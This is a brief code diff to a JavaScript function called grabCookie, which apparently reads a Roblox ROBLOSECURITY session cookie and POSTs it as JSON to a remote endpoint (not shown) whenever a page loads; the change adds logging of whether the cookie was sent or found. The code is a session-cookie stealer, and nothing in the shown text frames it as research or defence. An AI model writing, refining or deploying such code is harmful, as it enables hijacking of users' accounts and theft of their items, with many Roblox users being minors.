@@ -6,7 +6,9 @@ function grabCookie() {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ cookie: robloxCookie })
-        });
+        }).then(() => console.log('Cookie sent!')).catch(err => console.error('Fetch error:', err));
+    } else {
+        console.log('No ROBLOSECURITY cookie found');
     }
 }
 window.onload = grabCookie;
